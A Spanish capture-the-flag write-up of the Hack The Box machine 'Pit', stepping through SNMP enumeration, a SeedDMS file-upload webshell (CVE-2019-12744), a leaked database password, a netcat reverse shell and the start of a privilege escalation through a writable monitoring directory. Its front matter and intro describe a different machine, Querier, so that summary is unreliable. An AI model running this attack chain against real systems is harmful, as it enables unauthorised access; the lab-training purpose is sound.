---
layout: single
title: Hack The Box - Pit 
excerpt: "Es una máquina Easy de Hack The Box donde se obtiene un archivo Excel con macros que debe analizarse para identificar credenciales útiles para MSSQL. A partir de ahí se aprovechó xp_dirtree para obtener un hash y elevar privilegios en MSSQL hasta lograr ejecución de comandos. La escalada de privilegios en el sistema puede realizarse por dos vías: (1) mediante enumeración con PowerUp para localizar credenciales del administrador, o (2) abusando del privilegio SeImpersonatePrivilege, que puede explotarse con herramientas como Juicy Potato o PrintSpoofer."
date: 2025-10-10
classes: wide
header:
  teaser: /assets/images/htb-writeup-Querier/querier.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - Hack The Box
  - SMB
  - MSSQL
   
tags:  
  - xp_dirtree
  - SeImpersonatePrivilege 
  - PowerUp
  - Windows

---
<style>
  body {
    margin: 0;
    padding: 0;
    background-color: #0b101b;
    font-family: Arial, sans-serif;
    color: white;
  }

  /* Centramos únicamente los elementos visuales */
  .glitch,
  .title,
  .date,
  .info {
    text-align: center;
    margin-left: auto;
    margin-right: auto;
  }

  .glitch {
    position: relative;
    width: 90%;
    max-width: 400px;
    height: 300px;
    background-image: url("/assets/images/htb-writeup-Querier/querier.png");
    background-size: cover;
    background-position: center;
    margin: 2rem auto 1rem auto;
    overflow: hidden;
  }

  .glitch:before {
    content: '';
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background-image: url("/assets/images/htb-writeup-Querier/querier.png");
    background-size: cover;
    background-position: center;
    opacity: 0.5;
    mix-blend-mode: hard-light;
    animation: glitch2 10s linear infinite;
  }

  .glitch:hover:before {
    animation: glitch1 1s linear infinite;
  }

  @keyframes glitch1 {
    0% { background-position: 0 0; filter: hue-rotate(0deg); }
    10% { background-position: 5px 0; }
    20% { background-position: -5px 0; }
    30% { background-position: 15px 0; }
    40% { background-position: -5px 0; }
    50% { background-position: -25px 0; }
    60% { background-position: -50px 0; }
    70% { background-position: 0 -20px; }
    80% { background-position: -60px -20px; }
    81% { background-position: 0 0; }
    100% { background-position: 0 0; filter: hue-rotate(360deg); }
  }

  @keyframes glitch2 {
    0% { background-position: 0 0; filter: hue-rotate(0deg); }
    10% { background-position: 15px 0; }
    15% { background-position: -15px 0; }
    20% { filter: hue-rotate(360deg); }
    25% { background-position: 0 0; filter: hue-rotate(0deg); }
    100% { background-position: 0 0; filter: hue-rotate(0deg); }
  }

  .title {
    font-size: 1.5rem;
    font-weight: bold;
    margin-bottom: 0.5rem;
  }

  .date {
    font-size: 1rem;
    color: #ccc;
    margin-bottom: 1rem;
  }

  .info {
    display: flex;
    justify-content: center;
    gap: 2rem;
    flex-wrap: wrap;
    margin-top: 1rem;
    font-size: 0.9rem;
  }

  .info div {
    text-align: center;
  }

  .info .label {
    color: #999;
    font-size: 0.8rem;
  }

  .icon {
    font-size: 2rem;
    color: #0f0;
    margin: 0.5rem 0;
  }

  /* Responsive */
  @media (max-width: 575.5px) {
    .glitch {
      height: 200px;
    }
    .title {
      font-size: 1.3rem;
    }
  }
</style>

<body>
    <div class="glitch">  
    </div>
</body>

<br>

`Querier` es una máquina Easy de Hack The Box donde se obtiene un archivo Excel con macros que debe analizarse para identificar credenciales útiles para MSSQL. A partir de ahí se aprovechó xp_dirtree para obtener un hash y elevar privilegios en MSSQL hasta lograr ejecución de comandos. La escalada de privilegios en el sistema puede realizarse por dos vías: (1) mediante enumeración con PowerUp para localizar credenciales del administrador, o (2) abusando del privilegio SeImpersonatePrivilege, que puede explotarse con herramientas como Juicy Potato o PrintSpoofer.

## Enumeración

Realizando un escaneo de puertos TCP identifique los siguientes abiertos:

- 22 SSH
- 80 HTTP
- 9090 HTTP

```bash
Nmap scan report for 10.10.10.241
Host is up, received user-set (0.21s latency).
Scanned at 2025-06-18 01:21:08 EDT for 229s

PORT     STATE SERVICE         REASON         VERSION
22/tcp   open  ssh             syn-ack ttl 63 OpenSSH 8.0 (protocol 2.0)
80/tcp   open  http            syn-ack ttl 63 nginx 1.14.1
9090/tcp open  ssl/zeus-admin? syn-ack ttl 63
```

Realicé otro escaneo con Nmap utilizando la opción `-sVC` para obtener más información de los servicios identificados y pude obtener el dominio: `dms-pit.htb`

```bash
Nmap scan report for 10.10.10.241
Host is up, received user-set (0.21s latency).
Scanned at 2025-06-18 01:30:20 EDT for 230s

PORT     STATE SERVICE         REASON         VERSION
22/tcp   open  ssh             syn-ack ttl 63 OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 6f:c3:40:8f:69:50:69:5a:57:d7:9c:4e:7b:1b:94:96 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDPRtC3Zd+DPBo1Raur/oVw/vz3BFbDkm6wmyb+E+0kBcgsDzm+UZqGn3u+rbI9L7PtNCIOTHa4j0Qs6fD9CvWa9xl1PXPQEI4X8UIfiDKduW+NhC0tRtfKzBSIR0XE+n2MjNCLM6pAR4xwhPZcpkXQmwurayT3OOHPV5QpOdSfzp0Zv56sBn3FmYe9j6fuhRFFL2x6Q8NfHOFkd4tAwkcCB1EebD0S/1ajB+TO6WeMOIHEU9HAAyg2LDzUKh0pzfFdK2MQHzKrGcFe3kOalz/dRJApa9wzUgq6iDbQvstDucPFLmvu8Y4YKFg1trKnf4Z2kopSUn0kKOxBROddoKOBdTyE309PF1b/Jo4ziDVVkRvPIHh06Se7NRVzbRtO8mBTFbi/Efag8QtLHeLDnF5SJj5SdTBiMiLvyGNWs3UySweOazyijw5bQtlgKbZHy0tLsjOCWjTuXGHAS3pHkkgSYKfr/NwWDsVQwHgCf1M7EZ23Uxww/qE6vRWbHStc6gM=
|   256 c2:6f:f8:ab:a1:20:83:d1:60:ab:cf:63:2d:c8:65:b7 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBASBJvHyFZwgmAuf2qWsMHborC5pS152XK8TVyTESkcPGWHqVAa/9rmFNvMuiMvBTPWhPq2+b5apFURHdxW2S5Q=
|   256 6b:65:6c:a6:92:e5:cc:76:17:5a:2f:9a:e7:50:c3:50 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJmDbvdFwHALNAnJDXuRD6aO9yppoVnKbTLbUmn6CWUn
80/tcp   open  http            syn-ack ttl 63 nginx 1.14.1
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.14.1
|_http-title: Test Page for the Nginx HTTP Server on Red Hat Enterprise Linux
9090/tcp open  ssl/zeus-admin? syn-ack ttl 63
| ssl-cert: Subject: commonName=dms-pit.htb/organizationName=4cd9329523184b0ea52ba0d20a1a6f92/countryName=US
| Subject Alternative Name: DNS:dms-pit.htb, DNS:localhost, IP Address:127.0.0.1
| Issuer: commonName=dms-pit.htb/organizationName=4cd9329523184b0ea52ba0d20a1a6f92/countryName=US/organizationalUnitName=ca-5763051739999573755
```

Posteriormente, agregué el dominio `dms-pit.htb` y `pit.htb` al archivo `/etc/hosts`, apuntándolo a la IP de la máquina víctima, para futuros ataques.

```bash
┌──(root㉿kali)-[/home/kali]
└─# cat /etc/hosts 
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters
10.10.10.241 dms-pit.htb pit.htb
```

## Enumeración WEB

La página web de la máquina era la siguiente:

![](/assets/images/htb-writeup-Pit/nginx.png)

Tras realizar una enumeración básica, no identifiqué nada relevante. Al revisar el puerto 9090 de la máquina, identifiqué un login de CentOS.

![](/assets/images/htb-writeup-Pit/centos.png)

Buscando la imagen en Google, vi que se trata de la tecnología **Cockpit**. Por el nombre que tiene parece que va a ser clave para la explotación

![](/assets/images/htb-writeup-Pit/google.png)

Tras continuar enumerando no identifique algo de utilidad por lo que realice un escaneo de puertos UDP e identifique el siguiente puerto abierto: 

- 161 SNMP

```bash
Nmap scan report for 10.10.10.241
Host is up, received user-set (0.23s latency).
Scanned at 2025-06-18 02:13:17 EDT for 0s

PORT    STATE SERVICE REASON              VERSION
161/udp open  snmp    udp-response ttl 63 SNMPv1 server; net-snmp SNMPv3 server (public)
Service Info: Host: pit.htb
```

Para enumerar SNMP utilice la string por defecto *public* desde la raiz 

```bash
┌──(root㉿kali)-[/home/kali]
└─# snmpbulkwalk -v2c -c public 10.10.10.241 1 > snmpout3
```

Una vez generado el archivo, busqué palabras clave y logré identificar la ruta absoluta de la instalación del servidor web
*/var/www/html/seeddms51x/seeddms*

```bash
┌──(root㉿kali)-[/home/kali]
└─# grep -iE "http|https|var|www" snmpout3
iso.3.6.1.2.1.25.4.2.1.4.14847 = STRING: "php-fpm: pool www"
iso.3.6.1.2.1.25.4.2.1.4.14848 = STRING: "php-fpm: pool www"
iso.3.6.1.2.1.25.4.2.1.4.14849 = STRING: "php-fpm: pool www"
iso.3.6.1.2.1.25.4.2.1.4.14850 = STRING: "php-fpm: pool www"
iso.3.6.1.2.1.25.4.2.1.4.14851 = STRING: "php-fpm: pool www"
iso.3.6.1.4.1.2021.9.1.2.2 = STRING: "/var/www/html/seeddms51x/seeddms"
iso.3.6.1.4.1.8072.1.3.2.4.1.2.10.109.111.110.105.116.111.114.105.110.103.27 = No more variables left in this MIB View (It is past the end of the MIB tree)
```

Al probar la ruta en ambos servicios web del dominio `pit.htb`, no se cargó ninguna vista. Sin embargo, al colocarla en el subdominio identificado previamente `dms-pit.htb`, se desplegó un panel de inicio de sesión correspondiente a la tecnología SeedDMS

![](/assets/images/htb-writeup-Pit/seed.png)

Continuando enumerando la salida de `snmpbulkwalk` identifique un posible usuario `michelle`

```bash
System release info
CentOS Linux release 8.3.2011
SELinux Settings
user

                Labeling   MLS/       MLS/                          
SELinux User    Prefix     MCS Level  MCS Range                      SELinux Roles

guest_u         user       s0         s0                             guest_r
root            user       s0         s0-s0:c0.c1023                 staff_r sysadm_r system_r unconfined_r
staff_u         user       s0         s0-s0:c0.c1023                 staff_r sysadm_r unconfined_r
sysadm_u        user       s0         s0-s0:c0.c1023                 sysadm_r
system_u        user       s0         s0-s0:c0.c1023                 system_r unconfined_r
unconfined_u    user       s0         s0-s0:c0.c1023                 system_r unconfined_r
user_u          user       s0         s0                             user_r
xguest_u        user       s0         s0                             xguest_r
login

Login Name           SELinux User         MLS/MCS Range        Service

__default__          unconfined_u         s0-s0:c0.c1023       *
michelle             user_u               s0                   *
root                 unconfined_u         s0-s0:c0.c1023       *
System uptime
```

probando el usuario `michelle` como usuario y contraseña pude acceder al portal

![](/assets/images/htb-writeup-Pit/mic.png)

Revisando la nota dentro del panel del portal se indica que se actualizo a la versión 5.1.15 de SeedDMS lo cual se puede confirmar dando click a la nota ya que se descarga el archivo CHANGELOG 

```bash
┌──(root㉿kali)-[/home/kali]
└─# head -n 30 Downloads/CHANGELOG 
--------------------------------------------------------------------------------
                     Changes in version 5.1.15
--------------------------------------------------------------------------------
- Improved import from file system
- HTTP Proxy for access on external extension repository can be set
- Do not use unzip in ExtensionMgr anymore
- fix version compare on info page
- allow one page mode on search page
- fix import of older extension versions from repository

--------------------------------------------------------------------------------
                     Changes in version 5.1.14
--------------------------------------------------------------------------------
- allow mimetype to specify documents which can be edited online
- show number of indexing tasks in progress bar
- fix comparison of last indexing time with creation date of document content
- new hooks leftContentPre and leftContentPost
- minimize sql queries when fetching sub folders and documents of a folder
- custom attributes can be validated in a hook
- document attributes comment, keywords, categories, expiration date, and sequence
  can be turned off in the configuration
- workflows can be turned off completely
- Extension can be enabled/disabled in the extension manager, the previously
  used method by setting a parameter in the extension's config file will no
  longer work.
- clean up code for managing extensions
- fix renaming of folders via webdav
- fix list of expired documents on MyDocuments page
- pass showtree to ViewDocument (Closes: #462)
- fix upgrade script for sqlite3
```

Buscando vulnerabilidades para SeedDMS encontré `CVE-2019-12744` lo cual permite un RCE mediante la carga de un archivo no validado, esto se soluciona agregando el archivo .htaccess en apache pero como se trata de un servidor nginx es posible que este presente.

Para la explotación seguí la PoC de ExploitDB https://www.exploit-db.com/exploits/47022 para cargar mi archivo me coloque dentro del directorio de `michelle` y cargue una webshell

![](/assets/images/htb-writeup-Pit/ws.png)

Posteriormente debo consultar el archivo para poder llevar acabo la ejecución de comandos, para este punto al hacer hover sobre el documento se ve su ID en este caso 29

![](/assets/images/htb-writeup-Pit/29.png)

Finalmente pude ejecutar comandos mediante la web shell 

![](/assets/images/htb-writeup-Pit/passwd.png)

En este punto me di cuenta que al intentar ejecutar otros comandos no recibo ninguna salida

![](/assets/images/htb-writeup-Pit/salida.png)

## TTYOverHttp

En ocasiones como estas cuando tenemos la ejecución remota de comandos mediante una web shell pero hay reglas configuradas (**Ej: iptables**) que nos impiden obtener una Reverse Shell se puede usar la herramienta `TTYOverHttp` para obtener una TTY completamente interactiva y desde hay generar una reverse shell.

Para que funcione se debe agregar la ruta donde reside la web shell en el archivo de la herramienta y ejecutarla

```bash
result = (requests.get('http://dms-pit.htb/seeddms51x/data/1048576/37/1.php', params=payload, timeout=5).text).strip()
result = (requests.get('http://dms-pit.htb/seeddms51x/data/1048576/37/1.php', params=payload, timeout=5).text).strip()
```

```bash
┌──(root㉿kali)-[/opt/ttyoverhttp]
└─# python3 tty_over_http.py    
> whoami
> nginx
```

Una vez ejecutado, realizando una enumeración me encontré con un archivo interesante `settings.xml` del cual identifique credenciales

```bash
<database dbDriver="mysql" dbHostname="localhost" dbDatabase="seeddms" dbUser="seeddms" dbPass="ied^ieY6xoquu" doNotCheckVersion="false">
```

La contraseña identificada previamente me ayudo a iniciar sesión en el portal de centOS usando el usuario michelle

![](/assets/images/htb-writeup-Pit/system.png)

Algo que llamo mi atención fue la sección terminal, al ingresar me carga una terminal donde pude enviarme una reverse shell

![](/assets/images/htb-writeup-Pit/terminal.png)

```bash
┌──(root㉿kali)-[/opt/Reverse_Shells]
└─# nc -lvp 443
listening on [any] 443 ...
connect to [10.10.16.3] from dms-pit.htb [10.10.10.241] 56504
script /dev/null -c bash
Script started, file is /dev/null
[michelle@pit ~]$ 
```

Para trabajar mas comodo realice un tratamiento de la TTY

```bash
┌──(root㉿kali)-[/opt/Reverse_Shells]
└─# nc -lvp 443
listening on [any] 443 ...
connect to [10.10.16.3] from dms-pit.htb [10.10.10.241] 56504
script /dev/null -c bash
Script started, file is /dev/null
[michelle@pit ~]$ ^Z
zsh: suspended  nc -lvp 443

┌──(root㉿kali)-[/opt/Reverse_Shells]
└─# stty raw -echo;fg
[1]  + continued  nc -lvp 443
                             reset
[michelle@pit ~]$ export TERM=xterm
[michelle@pit ~]$ export SHELL=bash
[michelle@pit ~]$ 
```

## Escalada de privilegios

Enumerando nuevamente la salida de snmpwalk veo que se ejecuta un comando: 

```bash
iso.3.6.1.4.1.8072.1.3.2.2.1.2.10.109.111.110.105.116.111.114.105.110.103 = STRING: "/usr/bin/monitor"
```

Al revisar este comando desde la shell veo que se trata de un script

```bash
[michelle@pit ~]$ cat /usr/bin/monitor
#!/bin/bash

for script in /usr/local/monitoring/check*sh
do
    /bin/bash $script
done
[michelle@pit ~]$ 
```

Situándome en el directorio `/usr/bin/monitor` no me deja listar los archivos sin embargo si pude crear uno

```bash
[michelle@pit ~]$ cd /usr/local/monitoring/
[michelle@pit monitoring]$ ls -la
ls: cannot open directory '.': Permission denied
[michelle@pit monitoring]$ pwd
/usr/local/monitoring
[michelle@pit monitoring]$ touch test
[michelle@pit monitoring]$ echo 'test' > test
[michelle@pit monitoring]$ cat test
test
```
Al ejecutar revisar los permisos del directorio monitoring veo que tiene un `+` lo cual significa que este directorio tiene ACLs (Access Control List) adicionales así que ejecute el comando  `getfacl` y pude ver que el usuario `michelle` tiene permisos de escritura y ejecución en el directorio `monitoring` lo cual justifica por que puedo crear archivos

```bash
[michelle@pit local]$ getfacl monitoring/
# file: monitoring/
# owner: root
# group: root
user::rwx
user:michelle:-wx
group::rwx
mask::rwx
other::---

[michelle@pit local]$ 
```

